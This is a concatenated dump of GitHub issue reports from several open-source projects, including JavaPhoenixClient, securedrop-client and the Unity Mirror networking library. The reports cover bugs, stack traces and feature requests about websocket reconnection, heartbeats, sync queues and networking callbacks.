       at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
       at java.lang.Thread.run(Thread.java:764)
``` OkHttp terminated support for earlier android versions in 3.13. THis client should not prevent android min target because of a dependency. Retrofit is also pinned to 3.12.2 so this is a safe downgrade Is this the best way to extract data from the Message.payload or am I missing a trick?

    private fun onPhoenixOpen(m : Message) {
        val response = m.payload["response"] as LinkedTreeMap<*, *>
        val permissionsTokenEncoded = response.get("perms_token")
    }

LinkedTreeMap is an implementation detail that's leaking out of JavaPhoenixClient and I would rather avoid it, especially if you plan to switch to the built-in serialization library in future. JS version goes up to 10 seconds https://github.com/phoenixframework/phoenix/blob/master/assets/js/phoenix.js#L729, 
here we go up to 100 seconds https://github.com/dsrees/JavaPhoenixClient/blob/master/src/main/kotlin/org/phoenixframework/PhxSocket.kt#L49.
Is that on purpose or a simple typo? Hi @dsrees 
I wanted to update the library but I see that a lot has changed. 

Could you provide a bit more information about reconnection strategy?

The reason I'm asking this is that I do have my own reconnection strategy for WS errors and know it would be duplicated with the one provided from the library. 
I do see that you do retry only for specific errors and I'm wondering if it would be possible to maybe implement this is a bit more configurable way? So we could choose the strategy like only for errors or when the WS was closed or both. Does it make sense?  The last PR introduced a bug where the lib tries to reconnect even when the websocket is closed intentionally by calling `disconnect()`

This is what is happening:
1. `disconnect()` is called
2. `onConnectionClosed()` is invoked
3. `reconnectTimer` is scheduled 
4. `reconnectTimer` connects to WebSocket again


I think we should somehow distinguish `disconnect()` called be the user and by the library itself. This would give us an option to know wether we should still want to try to reconnect or not.

@dsrees Could you look at this?  Will the error callback on PhxSocket be called when sending heartbeat fails? 

From what I've seen it does not, but what is the purpose of the heartbeat then? 

 Is this the best way to extract data from the Message.payload or am I missing a trick?

    private fun onPhoenixOpen(m : Message) {
        val response = m.payload["response"] as LinkedTreeMap<*, *>
        val permissionsTokenEncoded = response.get("perms_token")
    }

LinkedTreeMap is an implementation detail that's leaking out of JavaPhoenixClient and I would rather avoid it, especially if you plan to switch to the built-in serialization library in future. In PhxPush.kt
```
/**
     * Starts the Timer which will trigger a timeout after a specific delay
     * in milliseconds is reached.
     */
    fun startTimeout() {
        this.timeoutTimer?.cancel()

        val ref = this.channel.socket.makeRef()
        this.ref = ref

        val refEvent = this.channel.replyEventName(ref)
        this.refEvent = refEvent

        // If a response is received  before the Timer triggers, cancel timer
        // and match the received event to it's corresponding hook.
        this.channel.on(refEvent) {
            this.cancelRefEvent()
            this.cancelTimeout()
            this.receivedMessage = it

            // Check if there is an event status available
            val message = it
            message.status?.let {
                this.matchReceive(it, message)
            }
        }

        // Start the timer. If the timer fires, then send a timeout event to the Push
        this.timeoutTimer = Timer()
        this.timeoutTimer?.schedule(timeout) {
            trigger("timeout", HashMap())
        }
    }
```
I think what is happenign is that if the timeout actually happens then a Message like `PhxMessage(ref=chan_reply_8, topic=, event=, payload={status=timeout}, joinRef=null)`  is triggered.  This is fine.  However the bindings created with `this.channel.on(refEvent)` are never removed. After upgrading from 0.1.8 to the latest version (0.2.5) we are noticing that the Heardbeats are not sent regularly anymore. Instead they seem to be sent only once after the connexion is established.

After looking quickly at the code it seems that the hearbeat scheduling is done in `Socket`, line 370:
```
dispatchQueue.queue(heartbeatInterval, TimeUnit.MILLISECONDS) { sendHeartbeat() }
```

And looking at the implementation (`dispatchQueue` is a `ScheduledDispatchQueue`), I see that it's based on `ScheduledThreadPoolExecutor.schedule` which is a one-shot API, not a periodic one.

Is this correct? I'm getting a lot of this on a recent library version. Could you look at this?

```
java.util.ConcurrentModificationException: 
  at java.util.ArrayList$Itr.next (ArrayList.java:860)
  at org.phoenixframework.Socket.onConnectionError$JavaPhoenixClient (Socket.java:511)
  at org.phoenixframework.Socket$connect$3.invoke (Socket.java:235)
  at org.phoenixframework.Socket$connect$3.invoke (Socket.java:61)
  at org.phoenixframework.WebSocketTransport.onFailure (WebSocketTransport.java:136)
  at okhttp3.internal.ws.RealWebSocket.failWebSocket (RealWebSocket.java:570)
  at okhttp3.internal.ws.RealWebSocket$1.onFailure (RealWebSocket.java:216)
  at okhttp3.RealCall$AsyncCall.execute (RealCall.java:180)
  at okhttp3.internal.NamedRunnable.run (NamedRunnable.java:32)
  at java.util.concurrent.ThreadPoolExecutor.runWorker (ThreadPoolExecutor.java:1162)
  at java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:636)
  at java.lang.Thread.run (Thread.java:784)
``` When serializing Payload objects, the default JSON behaviour is to convert from camel case to snake case: https://github.com/dsrees/JavaPhoenixClient/blob/master/src/main/kotlin/org/phoenixframework/Defaults.kt#L52

I presume it was done deliberately for internal reasons, but it is a bit of a surprise.

I don't think this is what the equivalent Javascript library does: https://github.com/phoenixframework/phoenix/blob/master/assets/js/phoenix.js#L648 I'm getting a lot of this on a recent library version. Could you look at this?

```
java.util.ConcurrentModificationException: 
  at java.util.ArrayList$Itr.next (ArrayList.java:860)
  at org.phoenixframework.Socket.onConnectionError$JavaPhoenixClient (Socket.java:511)
  at org.phoenixframework.Socket$connect$3.invoke (Socket.java:235)
  at org.phoenixframework.Socket$connect$3.invoke (Socket.java:61)
  at org.phoenixframework.WebSocketTransport.onFailure (WebSocketTransport.java:136)
  at okhttp3.internal.ws.RealWebSocket.failWebSocket (RealWebSocket.java:570)
  at okhttp3.internal.ws.RealWebSocket$1.onFailure (RealWebSocket.java:216)
  at okhttp3.RealCall$AsyncCall.execute (RealCall.java:180)
  at okhttp3.internal.NamedRunnable.run (NamedRunnable.java:32)
  at java.util.concurrent.ThreadPoolExecutor.runWorker (ThreadPoolExecutor.java:1162)
  at java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:636)
  at java.lang.Thread.run (Thread.java:784)
``` Received this a couple of times. client version 0.2.5
```
Fatal Exception: java.util.ConcurrentModificationException
       at java.util.ArrayList$Itr.next(ArrayList.java:860)
       at org.phoenixframework.Socket.triggerChannelError(Socket.kt:467)
       at org.phoenixframework.Socket.onConnectionError$JavaPhoenixClient(Socket.kt:458)
       at org.phoenixframework.Socket$connect$3.invoke(Socket.kt:229)
       at org.phoenixframework.Socket$connect$3.invoke(Socket.kt:66)
       at org.phoenixframework.WebSocketTransport.onFailure(Transport.kt:134)
       at okhttp3.internal.ws.RealWebSocket.failWebSocket(RealWebSocket.java:571)
       at okhttp3.internal.ws.RealWebSocket$1.onFailure(RealWebSocket.java:221)
       at okhttp3.RealCall$AsyncCall.execute(RealCall.java:225)
       at okhttp3.internal.NamedRunnable.run(NamedRunnable.java:32)
       at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
       at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
       at java.lang.Thread.run(Thread.java:764)
``` Thanks for the library.

I'm having issues connecting and I haven't been able to track down the cause.

- Server is running correctly.
- `INTERNET` and `ACCESS_NETWORK_STATE` permissions have been added to `AndroidManifest.xml`.

Here's my activity:

```
package com.mydomain.myapp

import android.support.v7.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import org.phoenixframework.PhxSocket

class MainActivity : AppCompatActivity() {
  private val TAG = "MainActivity";

  override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)
    setContentView(R.layout.activity_main)
    this.connectToChatRoom()
  }

  fun connectToChatRoom() {

    // Create the Socket
    val params = hashMapOf("token" to "abc123")
    val url = "http://localhost:4000/socket/websocket"
    val socket = PhxSocket(url, params)

    // Listen to events on the Socket
    socket.logger = { Log.d("TAG", it) }
    socket.onOpen { Log.d("TAG", "Socket Opened") }
    socket.onClose { Log.d("TAG", "Socket Closed") }
    socket.onError { throwable, response ->
      throwable?.printStackTrace()
      Log.d("Message", throwable?.message)
      Log.d("Response:", "${response?.toString()}")
      Log.d(throwable.toString(), "\"Socket Error\"")
    }

    socket.connect()

    // Join channels and listen to events
    val chatroom = socket.channel("user:1")
    chatroom.on("new_message") {
      // `it` is a PhxMessage object
      val payload = it.payload
      Log.d("TAG", "payload received")
    }

    chatroom.join()
      .receive("ok") { /* Joined the chatroom */ }
      .receive("error") { /* failed to join the chatroom */ }
  }
}
```

And here's my log:

```
2018-12-14 13:24:30.806 17467-17467/com.mydomain.myapp D/NetworkSecurityConfig: No Network Security Config specified, using platform default
2018-12-14 13:24:30.857 17467-17484/com.mydomain.myapp D/TAG: Transport: error
2018-12-14 13:24:30.859 17467-17484/com.mydomain.myapp W/System.err: java.net.ConnectException: Failed to connect to localhost/127.0.0.1:4000
2018-12-14 13:24:30.859 17467-17484/com.mydomain.myapp W/System.err:     at okhttp3.internal.connection.RealConnection.connectSocket(RealConnection.java:242)
2018-12-14 13:24:30.859 17467-17484/com.mydomain.myapp W/System.err:     at okhttp3.internal.connection.RealConnection.connect(RealConnection.java:160)
2018-12-14 13:24:30.859 17467-17484/com.mydomain.myapp W/System.err:     at okhttp3.internal.connection.StreamAllocation.findConnection(StreamAllocation.java:257)
2018-12-14 13:24:30.859 17467-17484/com.mydomain.myapp W/System.err:     at okhttp3.internal.connection.StreamAllocation.findHealthyConnection(StreamAllocation.java:135)
2018-12-14 13:24:30.859 17467-17484/com.mydomain.myapp W/System.err:     at okhttp3.internal.connection.StreamAllocation.newStream(StreamAllocation.java:114)
2018-12-14 13:24:30.859 17467-17484/com.mydomain.myapp W/System.err:     at okhttp3.internal.connection.ConnectInterceptor.intercept(ConnectInterceptor.java:42)
2018-12-14 13:24:30.860 17467-17484/com.mydomain.myapp W/System.err:     at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:147)
2018-12-14 13:24:30.860 17467-17484/com.mydomain.myapp W/System.err:     at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:121)
2018-12-14 13:24:30.860 17467-17484/com.mydomain.myapp W/System.err:     at okhttp3.internal.cache.CacheInterceptor.intercept(CacheInterceptor.java:93)
2018-12-14 13:24:30.860 17467-17484/com.mydomain.myapp W/System.err:     at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:147)
2018-12-14 13:24:30.860 17467-17484/com.mydomain.myapp W/System.err:     at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:121)
2018-12-14 13:24:30.860 17467-17484/com.mydomain.myapp W/System.err:     at okhttp3.internal.http.BridgeInterceptor.intercept(BridgeInterceptor.java:93)
2018-12-14 13:24:30.860 17467-17484/com.mydomain.myapp W/System.err:     at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:147)
2018-12-14 13:24:30.860 17467-17484/com.mydomain.myapp W/System.err:     at okhttp3.internal.http.RetryAndFollowUpInterceptor.intercept(RetryAndFollowUpInterceptor.java:126)
2018-12-14 13:24:30.860 17467-17484/com.mydomain.myapp W/System.err:     at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:147)
2018-12-14 13:24:30.860 17467-17484/com.mydomain.myapp W/System.err:     at okhttp3.internal.http.RealInterceptorChain.proceed(RealInterceptorChain.java:121)
2018-12-14 13:24:30.860 17467-17484/com.mydomain.myapp W/System.err:     at okhttp3.RealCall.getResponseWithInterceptorChain(RealCall.java:200)
2018-12-14 13:24:30.860 17467-17484/com.mydomain.myapp W/System.err:     at okhttp3.RealCall$AsyncCall.execute(RealCall.java:147)
2018-12-14 13:24:30.860 17467-17484/com.mydomain.myapp W/System.err:     at okhttp3.internal.NamedRunnable.run(NamedRunnable.java:32)
2018-12-14 13:24:30.860 17467-17484/com.mydomain.myapp W/System.err:     at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1133)
2018-12-14 13:24:30.860 17467-17484/com.mydomain.myapp W/System.err:     at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:607)
2018-12-14 13:24:30.860 17467-17484/com.mydomain.myapp W/System.err:     at java.lang.Thread.run(Thread.java:761)
2018-12-14 13:24:30.861 17467-17484/com.mydomain.myapp W/System.err: Caused by: java.net.ConnectException: Connection refused
2018-12-14 13:24:30.861 17467-17484/com.mydomain.myapp W/System.err:     at java.net.PlainSocketImpl.socketConnect(Native Method)
2018-12-14 13:24:30.861 17467-17484/com.mydomain.myapp W/System.err:     at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:334)
2018-12-14 13:24:30.861 17467-17484/com.mydomain.myapp W/System.err:     at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:196)
2018-12-14 13:24:30.861 17467-17484/com.mydomain.myapp W/System.err:     at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:178)
2018-12-14 13:24:30.861 17467-17484/com.mydomain.myapp W/System.err:     at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:356)
2018-12-14 13:24:30.861 17467-17484/com.mydomain.myapp W/System.err:     at java.net.Socket.connect(Socket.java:605)
2018-12-14 13:24:30.861 17467-17484/com.mydomain.myapp W/System.err:     at okhttp3.internal.platform.AndroidPlatform.connectSocket(AndroidPlatform.java:71)
2018-12-14 13:24:30.861 17467-17484/com.mydomain.myapp W/System.err:     at okhttp3.internal.connection.RealConnection.connectSocket(RealConnection.java:240)
2018-12-14 13:24:30.861 17467-17484/com.mydomain.myapp W/System.err:  ... 21 more
2018-12-14 13:24:30.861 17467-17484/com.mydomain.myapp D/message: Failed to connect to localhost/127.0.0.1:4000
2018-12-14 13:24:30.861 17467-17484/com.mydomain.myapp D/java.net.ConnectException: Failed to connect to localhost/127.0.0.1:4000: "Socket Error"
2018-12-14 13:24:30.861 17467-17484/com.mydomain.myapp D/Response:: null
```

Any suggestions are appreciated! After upgrading from 0.1.8 to the latest version (0.2.5) we are noticing that the Heardbeats are not sent regularly anymore. Instead they seem to be sent only once after the connexion is established.

After looking quickly at the code it seems that the hearbeat scheduling is done in `Socket`, line 370:
```
dispatchQueue.queue(heartbeatInterval, TimeUnit.MILLISECONDS) { sendHeartbeat() }
```

And looking at the implementation (`dispatchQueue` is a `ScheduledDispatchQueue`), I see that it's based on `ScheduledThreadPoolExecutor.schedule` which is a one-shot API, not a periodic one.

Is this correct? For every channel push a new timer (and thus a new thread) is created.  This is quite expensive compared to using a ScheduledThreadPoolExecutor which would be re-using threads.

I plan on trying to convert all usages of Timers to using a shared ScheduledThreadPoolExecutor later in the week if this seems like a good change. For every channel push a new timer (and thus a new thread) is created.  This is quite expensive compared to using a ScheduledThreadPoolExecutor which would be re-using threads.

I plan on trying to convert all usages of Timers to using a shared ScheduledThreadPoolExecutor later in the week if this seems like a good change.
<---------->
141066455
登录之后，你第二次请求，肯定过不了验证啊。spring security是基于cookie还有SecurityContextHolder的，你这肯定不行啊，就算你改造jwt也不行啊。还是要根据jwt中的用户名和密码在登录的
<---------->
141252970
The module ``poisson_disk`` imports from ``auto_tag_photo``, but I can't find that package.
<---------->
141504341
## Description

When downloading a file, you'll see the "Downloading file..." message in the activity status bar. After it finishes, the "Last refresh" message does not reappear. It's blank until the next 5-minute refresh happens.

## STR

1. Download a file and see message in status bar
2. Wait until message goes away (~10 seconds)
3. See no "Last refresh" until the 5-minute sync occurs or until you just manually click the refresh button

## Expected behavior

By default, we should always show the last time a refresh occurred.

## Idea

* The `ActivityStatusBar` could keep a timer for each message and emit a signal when the message times out to the controller. Then the controller could grab the last time since a refresh and set the status of the activity bar. Similar to #389: we should add a `ReplySendJob` object which we add to the general queue when replies are sent in the client  ### Description

I want to open a discussion issue around where we make api calls from in the client.

We reference the SDK API from many places:

```
securedrop_client/logic.py:
securedrop_client/message_sync.py:
securedrop_client/queue.py
securedrop_client/storage.py
securedrop_client/api_jobs/base.py
securedrop_client/api_jobs/downloads.py
```

After we move reply and message sync logic to api jobs, we should consider creating the `sdclientapi.API` instance in `RunnableQueue` to help separate concerns. If a user logs out, the queue can pause and make sure no api calls are made. ## Description

Handle sqlalchemy exceptions when performing database operations. 

A context manager can be used to help: https://github.com/freedomofpress/securedrop-client/commit/4a9bd13181c0e1897ae8d3fdb5dfa056ed7024af#diff-0438bcd9fa8b6dd6a25960faa06c1452R14 After signing in to the app, rapidly changing the selected conversation prevents downloaded/decrypted messages from displaying

### STR

1. Boot dev container
1. Boot app
1. Sign in
1. Immediately click Source A
1. Immediately click Source B

### Expected

Source A and Source B should show the content of their messages.

### Actual

Source A and Source B show `Message not yet available` until a sync occurs (manual, timed)

### Notes

This is likely related to #352 and was likely caused by #345. I could be wrong. I think the underlying cause is that the decryption signal never hits the widget because it is garbage collected. When resizing the client window a bunch I noticed that sometimes the sourcelist wouldn't fully repaint a source item. I need to investigate this further to create a follow-up STR. ## Description

This was found while testing the `securedrop-client-0.0.7` deb package in `sd-svs`, it looks like import of keys is not working, which means that encrypting a reply to a source won't work 

## STR

0. start the client in Qubes
1. submit a new document as a source
2. click refresh

## Expected behavior

source key is imported

## Actual behavior 

The following log line appears:

```
qubes-gpg-client: unrecognized option '--import-options'
``` Previous behavior when reply failed to send: Entire message box would go red

Current behavior when reply fails to send: Same behavior as success (i.e. it's not obvious from the message bubble that the reply did not send)

It would be good if we could do something that was _towards_ the ultimate reply UX failure scenario (see suggestion to save drafts in #68), but just having the bottom bar in the message bubble go red might be a reasonable thing to do We should create a subclass of `QLabel` to help developers remember where they should be escaping html content, see: https://github.com/freedomofpress/securedrop-client/blob/2c52b15ff70e103c992f5c86942bb5f73004556e/securedrop_client/gui/widgets.py#L1130

The `SecureQLabel` class should be used in all cases where user input is displayed in the UI - namely the message box (`SpeechBubble `) and the preview snippet when implemented. 

(suggested by this talk on [leveraging type system for security](https://www.youtube.com/watch?v=ZplZ8ZBwu0Q) and #160)
 Unfortunately Pipenv isn't working well for our use case: we want to be able to selectively update single dependencies without updating other (unrelated) dependencies. While Pipenv does have some other nice features, this feature is a must-have. There are a bunch of upstream issues/PRs already tracking this:

* https://github.com/pypa/pipenv/issues/966
* https://github.com/pypa/pipenv/issues/418#issuecomment-315923039
* https://github.com/pypa/pipenv/issues/2412
* https://github.com/pypa/pipenv/issues/3461
* https://github.com/pypa/pipenv/pull/3304 (I just installed Pipenv from git and tried to use the functionality introduced in this PR, but when I tried to use it to update `sqlalchemy` only for #335 it still updated unrelated dependencies)

We've tried to work around this with #233, or by manually editing `Pipfile.lock` (which defeats the purpose of using a tool), and at this point I think we've spent too much time trying to get this tool to work for us, and should just fall back to using `pip-tools` as we do over in SecureDrop core. We can re-evaluate later if the situation upstream changes.  The CVE below is related to cert handling, so doesn't impact this repository. However, we should update the dependency nevertheless. 

<img width="689" alt="Screen Shot 2019-05-14 at 4 20 48 PM" src="https://user-images.githubusercontent.com/7832803/57738422-42bcfe00-7664-11e9-98e4-f6351c9525c1.png">
 # Description

Login to external server no longer works on latest `master` (06df84c) after merge of #362

# STR 

1. Set up the dev env in Qubes on latest `master`
2. Run the client without passing `--no-proxy`

# Expected behavior

I can log in to my staging server.

# Actual behavior

`AuthError`

# Comments

I have not debugged this yet, I inferred that the above was causing the problems by:

1. Reverting back to `securedrop-sdk==0.0.8`
2. Reverting back to bad39fa80a82774d36ee7f5c48fe974efba9b1ce

It's unclear yet if the fix involves this repo or the corresponding change made in the SDK: https://github.com/freedomofpress/securedrop-sdk/pull/80

I discovered this during test of my fix to #363 (will put a draft PR until the underlying issues here are resolved), which is another Qubes only issue. I'm going to file a PR to update our merge policies so that we are testing and catching these issues in Qubes prior to merge.  # Description

Login to external server no longer works on latest `master` (06df84c) after merge of #362

# STR 

1. Set up the dev env in Qubes on latest `master`
2. Run the client without passing `--no-proxy`

# Expected behavior

I can log in to my staging server.

# Actual behavior

`AuthError`

# Comments

I have not debugged this yet, I inferred that the above was causing the problems by:

1. Reverting back to `securedrop-sdk==0.0.8`
2. Reverting back to bad39fa80a82774d36ee7f5c48fe974efba9b1ce

It's unclear yet if the fix involves this repo or the corresponding change made in the SDK: https://github.com/freedomofpress/securedrop-sdk/pull/80

I discovered this during test of my fix to #363 (will put a draft PR until the underlying issues here are resolved), which is another Qubes only issue. I'm going to file a PR to update our merge policies so that we are testing and catching these issues in Qubes prior to merge.  Per the UX review today, the following tasks remain to be done on the refresh widget:

- [ ] The size of the refresh icon should match the [Zeplin auth widget spec](https://app.zeplin.io/project/5c807ea562f734bd2756b243/screen/5c86c91ea1202f046e7d92f4): 
  * static icon should be `15.1 x 15 pixels`
  * active icon (not in Zeplin yet) should just match size of static icon
  * disabled icon should be `20 x 19 pixels`
- [ ] Opacity of icons should be `92%`
- [x] After resizing the icon, we should still have a click area that's slightly larger than the icon itself, to ensure that users don't have to target it precisely 
- [ ] ~When in active state, the icon should be animated (["rotating at a pleasingly elegant pace... nothing frenetic or sluggy"](https://github.com/freedomofpress/securedrop-ux/issues/17#issuecomment-472164510))~
- [x] We should use title case for the label: "Last Refresh"
- [ ] The icon will need to be updated to the final version; @ninavizz will provide it in  https://github.com/freedomofpress/securedrop-ux/issues/17
 While we have unit tests, for maintainability it would be useful to additionally have functional tests that verify the behavior of the application from the perspective of the user. There's a [pytest-qt plugin](https://pytest-qt.readthedocs.io/en/latest/tutorial.html) which enables one to test in this manner by simulating the user's mouse clicks/keyboard input.  As of #374 there's a `RuntimeError` when the sha256 hash (provided in the ETag header) on a file does not verify, see https://github.com/freedomofpress/securedrop-client/pull/374#discussion_r286640523. 

This happens when a file is corrupted during download. We need to:

* Handle this exception
* Retry the download job again We should have the queue retry each API job N times for robustness (e.g. when Tor is particularly flaky). See my comment here: https://github.com/freedomofpress/securedrop-client/pull/374#discussion_r286635469 We have these lines in our code 3 times

```python
engine = make_engine(sdc_home)
Session = sessionmaker(bind=engine)
session = Session()
```

For simplicity, we may want to pass the `Session` around instead. This will also reduce the need to mock as heavily in tests. ## Description

Refreshing the client syncs local data with remote data correctly, however we no longer receive the sync_events signal with the "synced" message in the GUI, so it does not know when to update the icon back to a static state.

## STR

1. manually refresh the client and see how the icon never returns  It may be useful to have a persistent queue of certain pending actions on the server, e.g., replies, starring:

- it can be enforced that no duplicate actions are added to the queue (starring the same source twice);
- we can ensure that order-sensitive operations are performed on the server in the sequence in which the user performed them (e.g., replies are not sent out of order);
- retries can be performed even after a crash, and the state of the number of retries for a given action is known;
- when an operation ultimately fails after repeated retries, that failure can be reported to the user, e.g. to solve a connection problem and then retry the operation;
- when an action ultimately fails, but the state change is already implemented on the client, we can reset the client to the original state (e.g., a pending reply can be cancelled, a source unstarred).

Such a mechanism may potentially be used to queue up replies offline as well, though that is admittedly of less obvious benefit.
<---------->
141745943
**Describe the bug**
Starting a Host and stopping it via StopClient does not call OnStopHost.

**To Reproduce**
The code paths clearly show that the only location for OnStopHost to be called is in StopHost().
Since StopHost in turn calls StopServer and StopClient which both do duplicate work on shutting the network down, I was wondering if that shouldn't be part of too?

I mean, when I start only a server and call StopHost, I'll get a OnStopHost and OnStopClient call, even though neither are true.

**Expected behavior**
All the OnStop<NetworkType> callbacks meeting their respective requirement, should be called no matter how the network was shutdown. If StopClient causes the Host to be killed (not leaving the server active), the host was killed and the callback should be called.
The other way round, callbacks as mentioned above should not be called (OnStopClient when server was killed via StopHost) if not correct.

**Desktop (please complete the following information):**
* OS: Win 10 Enterprise
* Build target: Desktop UWP
* Unity version: 2018.4.12f1
* Mirror branch: one behind store I guess
 **Describe the bug**
Only when building with IL2CPP, an error about having to call `Start()` first (implied before calling `StopHost()`) is printed even though `StartHost()` was indeed called.

**Repro project**
https://drive.google.com/open?id=1mKiQjjXOO4TJI1QoMIDBd8QxJOjbdATm

**To Reproduce**
Steps to reproduce the behavior:
1. Open the attached project 'ReproProject_Mirror01'
2. Press Space to reload
3. See error
4. Press Escape to quit

**Expected behavior**
No error message should be printed, as is the case with play-in-editor and Mono builds.

**Desktop (please complete the following information):**
* OS: Windows 10
* Build target: Windows IL2CPP
* Unity version: 2019.2.15f1
* Mirror branch: "Version: 5.0.2 • Nov 3, 2019"

**Additional context**
The error message seems harmless; my game still works despite the error message.  But it is annoying, especially in development builds where errors are printed on-screen.
 **Describe the bug**
The isLocalPlayer variable is incorrect due to an incorrect assignment to ClientScene.localPlayer. This bug was introduced by the following commit: https://github.com/vis2k/Mirror/commit/eb62968bffdffcb2aad831e08ee2c39c96573d1e

**To Reproduce**
Steps to reproduce the behavior:
1. Create a server and connect to it with a local client (ie, have a server and client connect run on the same machine).
2. From another computer, connect to the server.
3. The ClientScene.localPlayer variable changes on the server to point to the latest connection. This occurs because NetworkClient is active due to the local connection on the server, and AddPlayerForConnection is invoked for every new connection added.

**Expected behavior**
I expect that the ClientScene.localPlayer variable should not be clobbered every time a new connection happens to the server.

**Desktop (please complete the following information):**
* OS: Windows 10
* Build target: Windows
* Unity version: 2018.4.11f1
* Mirror branch: Mirror 5.5.5 Hello,

Following the explanation in this link:
https://mirror-networking.com/docs/Guides/GameObjects/SpawnObjectCustom.html

I'd like to have the ability to pass extra parameters (Like rotation, or a netID that belongs to the owner) in spawner and unspawner when registering the delegation.

(I hope my English is understandable) reproducable in tanks demo.

editor: host
build: client

then in editor:

- host player: isServer=true, isClient=true (as expected)
- build player: isServer=true, **isClient=tru**e (it's not a client)

when running in server-only mode and connecting with a build client, isServer=true and isClient=false as expected. When I start a player in host mode and log a few properties in the overrides I get this:

Void Awake() hasAuthority=False isClient=False isLocalPlayer=False
Void OnStartServer() hasAuthority=False isClient=False isLocalPlayer=False
Void OnStartClient() hasAuthority=False isClient=True isLocalPlayer=False
Void OnStartAuthority() hasAuthority=True isClient=True isLocalPlayer=True
Void OnStartLocalPlayer() hasAuthority=True isClient=True isLocalPlayer=True
Void Start() hasAuthority=True isClient=True isLocalPlayer=True

Ideally all of those values should be true
 reproducable in tanks demo.

editor: host
build: client

then in editor:

- host player: isServer=true, isClient=true (as expected)
- build player: isServer=true, **isClient=true** (it's not a client)

when running in server-only mode and connecting with a build client, isServer=true and isClient=false as expected. top nav needs to be from main site or replicated the same as main site bottom footer from main site **Please explain the suggested feature in detail.**
This function is already marked public virtual void, however it contains references to two private variables that prevent us from fully overriding this in a base class.
1. loadingSceneAsync
2. startPositionIndex

**How exactly does this keep you from releasing your game right now?**
We would like to override this function to send a custom SceneMessage to the clients.  Since this happens after loadingSceneAsync is created and before startPositionIndex is set, we cannot do this in a derived class.  Additionally if we wanted to implement custom spawning code this would be impossible because startPositionIndex is private.  

**Can you suggest a possible solution?**
1. Make loadingSceneAsync a protected member.
2. Make startPositionIndex a protected member.

**Additional context**
Generally a public virtual function should probably not have references to private member variables.  It makes it problematic to override.
 **Describe the bug**
Mirror's weaver blocks certain tasks from completing successfully in batch mode.  Particularly, these tasks are those that use delayed calls such as EditorApplication.update or EditorApplication.delayCall.  This is due to the assembly being edited before these tasks can be completed, causing a reset.

**Repro project**
Don't currently have one, but I can make a quick one if needed.

**To Reproduce**
Steps to reproduce the behavior:
1. Run a task in batch mode using --batchmode and --executeMethod.
2. Observe the task not running EditorApplication.update, or any similar function.

**Expected behavior**
The task finishes with no issues.

**Screenshots**
None yet.

**Desktop (please complete the following information):**
* OS: Windows
* Build target: Windows Editor
* Unity version: 2018.3.5f1
* Mirror version: 6.3.0 stable, but should also happen in master.

**Additional context**
A quick fix is to only apply the weaver after the task is finished in batch mode.  For example:
```cs
        private static bool batchModeNeedsWeaving;
...

       static void WeaveExisingAssemblies()
        {
            // We should wait until our batch script finishes if we're in batch mode.
            if (Application.isBatchMode && !batchModeNeedsWeaving)
            {
                batchModeNeedsWeaving = true;
                EditorApplication.quitting += WeaveExisingAssemblies;
                return;
            }
...
        }

        static void OnCompilationFinished(string assemblyPath, CompilerMessage[] messages)
        {
            // We should wait until our batch script finishes if we're in batch mode.
            if (Application.isBatchMode && !batchModeNeedsWeaving)
            {
                batchModeNeedsWeaving = true;
                EditorApplication.quitting += () => OnCompilationFinished(assemblyPath, messages);
                return;
            }
...
        }
```
As a side note, WeaveExistingAssemblies is typo'd as WeaveExisingAssemblies. right nav doesn't show all things if the list is long (cropped) **Describe the bug**
Apparently it seems that if you have no NetworkBehaviours on a GameObject but have a NetworkIdentity attached (ie. a empty "shell" character) it will not initalize the `networkBehavioursCache` correctly (as in, it'll be null) and you'll get the error:

```
Network object Player Sphere(Clone) not initialized properly. Do you have more than one NetworkIdentity in the same object? Did you forget to spawn this object with NetworkServer?
UnityEngine.Debug:LogError(Object, Object)
Mirror.NetworkIdentity:OnStartAuthority() (at Assets/GitHub/Mirror/Runtime/NetworkIdentity.cs:529)
Mirror.NetworkIdentity:NotifyAuthority() (at Assets/GitHub/Mirror/Runtime/NetworkIdentity.cs:519)
Mirror.ClientScene:ApplySpawnPayload(NetworkIdentity, SpawnMessage) (at Assets/GitHub/Mirror/Runtime/ClientScene.cs:502)
Mirror.ClientScene:OnSpawn(SpawnMessage) (at Assets/GitHub/Mirror/Runtime/ClientScene.cs:531)
```
**Repro project**
See attached project.
[MirrorEmptyNetBehaviourCache1.zip](https://github.com/vis2k/Mirror/files/3958559/MirrorEmptyNetBehaviourCache1.zip)

**To Reproduce**
Steps to reproduce the behavior:
1. Open the attached project.
2. Open the SampleScene scene.
3. Run that scene, click "LAN Host". Notice that there's no error from the Sphere object which is the player object.
4. Build a server instance with the SampleScene scene
5. Connect to that server instance in the Editor, boom.
6. You should get the "not initialized properly" error.

**Expected behavior**
networkBehavioursCache should not be null, and would allow objects with NetworkIdentity scripts to initialize correctly.
Even if the cache is empty, it should not be null. This seems to be a regression?

**Screenshots**
N/A

**Desktop (please complete the following information):**
* OS: Windows
* Build target: Standalone Win/Mac/Linux x64 
* Unity version: 2018.4.12 LTS
* Mirror branch: Release 6.3.0

**Additional context**
Also happens in Mirror master as well as Mirror release 6.3.0. left nav needs to be an expanding tree of main classes > sub classes or just main classes alone **Describe the bug**
